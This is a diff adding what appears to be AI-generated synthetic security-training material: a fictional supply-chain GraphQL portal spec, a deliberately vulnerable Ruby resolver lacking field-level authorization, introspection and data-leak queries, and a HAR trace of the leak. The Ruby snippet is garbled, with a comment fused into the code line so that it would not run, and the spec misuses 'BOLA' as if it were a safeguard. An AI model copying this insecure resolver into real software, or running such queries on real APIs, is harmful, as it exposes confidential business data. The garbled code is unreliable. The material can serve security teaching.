@@ -1,0 +1,217 @@
+Here is the thirty-third system, continuing the focus on GraphQL-specific security failures. We are shifting into the **B2B / Supply Chain Management** sector, focusing on a **Partner Inventory & Order Tracking GraphQL API**.
+
+For the vulnerabilities, we are focusing on **Pattern 6.1 (Schema/relationship over-exposure - Introspection)** combined with **Pattern 9.1 (GraphQL Field Over-Fetching / Operations Flaw)**. This scenario demonstrates how an enabled GraphQL introspection feature reveals sensitive, internal fields (e.g., `internalAuditNotes`) that were intentionally excluded from B2B partner documentation. An attacker discovers and queries this field to leak confidential supply chain information.
+
+***
+
+# ENGINEERING ARCHITECTURE SPECIFICATION
+**System Name:** SupplyChain Partner GraphQL Portal
+**Document Version:** 4.1.0 (FINAL)
+**Classification:** CONFIDENTIAL / B2B OPERATIONAL DATA SCOPE
+**Domain:** Supply Chain / Inventory Management / Partner Integration
+
+## 1.0 Executive Summary
+The SupplyChain Portal provides B2B partners (e.g., manufacturers, shippers) with real-time access to their sales orders and inventory levels. It exposes a single GraphQL endpoint to allow partners to query highly customized data views.
+
+The core security requirement is that partners must only see data relevant to their operation. Crucially, the system utilizes a single `Order` data object in the database, which contains sensitive administrative notes that should only be visible to internal SupplyChain auditors, never external partners.
+
+## 2.0 Comprehensive Network Topology & GraphQL Processing
+The architecture uses a Ruby on Rails backend running a standard GraphQL implementation.
+
+### 2.1 The Ingress Layer & GraphQL Router
+* **Edge WAF:** Fronts the API, configured to allow only `POST /graphql`.
+* **GraphQL-Ruby Server:** The central routing layer. It is misconfigured to allow introspection queries.
+
+### 2.2 The Backend Core Services
+* **Order Service (Ruby on Rails):** Utilizes an ActiveRecord ORM layer to connect to a PostgreSQL database. The data model for `Order` includes a field `internal_audit_notes` which is intended to be excluded from all external API responses.
+
+## 3.0 Identity, Sessions, and Authorization
+Access is governed by tenant-scoped JWTs, ensuring BOLA between partners.
+
+### 3.1 Partner Authentication (JWT)
+Partners authenticate via a dedicated client credential flow, receiving a JWT that contains their unique `partner_id` (the tenant context).
+
+### 3.2 Field-Level Authorization Flaw
+The `Order` resolver performs a BOLA check (Pattern 1.5) to ensure the order belongs to the `partner_id` in the token. However, it fails to enforce field-level authorization. The `internalAuditNotes` field resolver has no guard clause and simply returns the database value if the parent object is authorized.
+
+## 4.0 Known System Debt & Theoretical Attack Surfaces
+*Internal Security Engineering Note: Introspection (Pattern 6.1) was enabled in the production environment during a debugging sprint and was never disabled. The internal auditor's field `internalAuditNotes` was manually excluded from the standard REST API but was accidentally left visible via the GraphQL introspection schema. Tracked as RISK-GRPH-905.*
+
+### 4.1 Vulnerability A: Introspection Leakage Leading to Unauthorized Field Over-Fetching
+**Taxonomy Pattern:** 6.1 (Schema/relationship over-exposure) & 9.1 (GraphQL Field Over-Fetching)
+**Sub-system:** Order Service Resolver (`Query: order` and `Order.internalAuditNotes`)
+
+**The Deep Architectural Flaw:**
+This attack is a two-step process: discovery via misconfiguration, and exploitation via over-fetching.
+
+1. **Schema Over-Exposure (Pattern 6.1):** The GraphQL server responds to the standard introspection query (`query { __schema { ... } }`). This reveals all types and fields, including the existence and exact name of the administrative field: `internalAuditNotes`.
+
+2. **Operations Flaw (Pattern 9.1):** Once the attacker knows the field name, they include it in an otherwise valid `order` query. The top-level resolver correctly verifies the partner's access to the `Order` object (BOLA passes). The nested `internalAuditNotes` field resolver then executes but, lacking its own field-level authorization check, returns the sensitive data.
+
+**The Exploitation Path:**
+
+1. **Discovery:** An attacker sends an introspection query to `/graphql` and receives the full schema, noting the field `Order.internalAuditNotes`.
+2. **The Target:** The attacker identifies one of their own orders (`ORD-99182A`) that they believe has sensitive internal notes attached.
+3. **The Query:** The attacker crafts a GraphQL query that targets the authorized order ID but explicitly requests the newly discovered administrative field.
+4. **The Execution:** The query executes successfully. The database query uses `SELECT *` (or equivalent) and returns the restricted note content to the external partner.
+5. **The Impact:** The partner extracts confidential internal audit notes for their orders, leaking proprietary metrics, pricing strategies, or fraud flags.
+
+***
+
+# SUPPLYCHAIN PARTNER API: SCHEMAS, VULNERABLE CODE, & GRAPHQL CONTRACTS
+**Document Version:** 3.1.2
+**Applies to Architecture:** SupplyChain Partner GraphQL Portal v4.1.0
+
+## 5.0 Order Database Schema (PostgreSQL / ActiveRecord)
+The database uses a single table for orders, combining external and internal attributes.
+
+```sql
+-- Core Order Table
+CREATE TABLE orders (
+order_id VARCHAR(50) PRIMARY KEY, -- e.g., 'ORD-99182A'
+partner_id VARCHAR(50) NOT NULL,
+order_status VARCHAR(20) NOT NULL,
+total_value DECIMAL(19, 4),
+internal_audit_notes TEXT, -- SENSITIVE: ONLY FOR INTERNAL AUDITORS
+created_at TIMESTAMP WITH TIME ZONE
+);
+
+CREATE INDEX idx_order_partner ON orders(partner_id);
+```
+
+## 6.0 The Flawed Implementation (Ruby on Rails / GraphQL-Ruby)
+The resolver code demonstrates the failure to implement field-level filtering, trusting the schema definition to hide the field.
+
+### 6.1 Vulnerable GraphQL Type Definition (The Introspection Source)
+```ruby
+# File: app/graphql/types/order_type.rb
+
+class Types::OrderType < Types::BaseObject
+
+field :order_id, ID, null: false
+field :order_status, String, null: false
+field :total_value, Float, null: false
+
+# VULNERABILITY 6.1: This field is defined in the schema (revealed via Introspection)
+# but has no authorization guard on its resolution.
+field :internal_audit_notes, String, null: trueThe resolver simply looks up the field value on the ActiveRecord modelThere is NO method called 'authorized?' or 'can_read_notes?' applied here.
+
+def internal_audit_notes
+object.internal_audit_notes
+end
+
+end
+```
+
+## 7.0 GraphQL API Contract (The Over-Fetching Attack)
+The attacker queries the field name discovered via the prior introspection request.
+
+### 7.1 Introspection Discovery Query
+**Endpoint:** `POST /graphql`
+**Required Headers:** `Authorization: Bearer <Partner_JWT>`
+
+**Introspection Request Payload:**
+```graphql
+query Introspection {
+__schema {
+queryType {
+fields {
+name
+}
+}
+types {
+name
+fields {
+name
+}
+}
+}
+}
+```
+
+### 7.2 Execute Unauthorized Field Query (Over-Fetching)
+**Endpoint:** `POST /graphql`
+**Malicious Request Payload:**
+```graphql
+query AuditNoteLeak {
+order(id: "ORD-99182A") {
+orderId
+orderStatus
+# Field discovered via Introspection (Pattern 6.1)
+internalAuditNotes # Field is accessible (Pattern 9.1)
+}
+}
+```
+
+**Success Response (200 OK - Internal Data Leak):**
+```json
+{
+"data": {
+"order": {
+"orderId": "ORD-99182A",
+"orderStatus": "SHIPPED",
+"internalAuditNotes": "Order flagged for potential fraud. High risk of chargeback (92%). Ship only to verified billing address. DO NOT offer rush shipping."
+}
+}
+}
+```
+
+***
+
+# SYNTHETIC ARTIFACT: GRAPHQL INTROSPECTION & FIELD OVER-FETCHING (HAR TRACE)
+**Applies to Architecture:** SupplyChain Partner GraphQL Portal v4.1.0
+**Vulnerabilities Referenced:** Section 4.1 (Pattern 6.1 & Pattern 9.1)
+
+This HTTP Archive (HAR) trace captures the moment the attacker exploits the exposed schema. The attacker, authenticated as a B2B partner, sends a GraphQL query that targets one of their authorized orders (`ORD-99182A`).
+
+The query explicitly includes the field `internalAuditNotes`, which the attacker previously discovered via an Introspection query (Pattern 6.1, not shown in this specific trace). The Ruby resolver successfully executes the BOLA check on the parent object (the order belongs to the partner) but fails to enforce field-level authorization on the sensitive attribute. The `200 OK` response confirms the over-fetching, exposing highly confidential internal fraud flags and shipping guidelines to the external partner.
+
+```json
+{
+"log": {
+"version": "1.2",
+"creator": {
+"name": "GraphQL-Ruby APM Logs",
+"version": "4.1.0"
+},
+"entries": [
+{
+"startedDateTime": "2026-04-10 T12:55:10.110Z",
+"time": 75,
+"request": {
+"method": "POST",
+"url": "https://api.supplychain-portal.com/graphql",
+"httpVersion": "HTTP/2.0",
+"headers": [
+{ "name": ":authority", "value": "api.supplychain-portal.com" },
+{ "name": "authorization", "value": "Bearer PARTNER_JWT_88192A..." },
+{ "name": "content-type", "value": "application/json" }
+],
+"queryString": [],
+"postData": {
+"mimeType": "application/json",
+"text": "{\"query\": \"query AuditNoteLeak { order(id: \\\"ORD-99182A\\\") { orderId orderStatus internalAuditNotes } }\"}"
+},
+"bodySize": 155
+},
+"response": {
+"status": 200,
+"statusText": "OK",
+"headers": [
+{ "name": "content-type", "value": "application/json" },
+{ "name": "x-resolver-nodes", "value": "1" }
+],
+"content": {
+"size": 310,
+"mimeType": "application/json",
+"text": "{\"data\": {\"order\": {\"orderId\": \"ORD-99182A\", \"orderStatus\": \"SHIPPED\", \"internalAuditNotes\": \"Order flagged for potential fraud. High risk of chargeback (92%). Ship only to verified billing address. DO NOT offer rush shipping.\"}}}"
+},
+"bodySize": 310
+}
+}
+]
+}
+}
+```
+
+***
